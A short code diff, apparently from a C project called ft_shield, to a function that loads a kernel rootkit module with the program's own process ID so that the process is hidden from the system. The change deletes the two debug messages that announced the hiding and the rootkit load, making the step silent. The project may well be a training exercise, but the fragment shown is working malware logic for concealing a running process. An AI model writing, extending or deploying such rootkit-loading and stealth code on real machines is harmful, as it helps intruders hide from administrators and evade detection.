@@ -64,10 +64,8 @@ void hide_pid(void) {
 	int pid = getpid();
 	char cmd[256];
 
-	dprintf(2, "Hiding %i\n", pid);
 	snprintf(cmd, sizeof(cmd), "insmod %s hidden_pid=%d", "/home/vagrant/ft_shield/srcs/modules/rootkit.ko", pid);
 	system(cmd);
-	dprintf(2, "Rootkit loaded\n");
 }
 
 void ft_daemonize(void) {
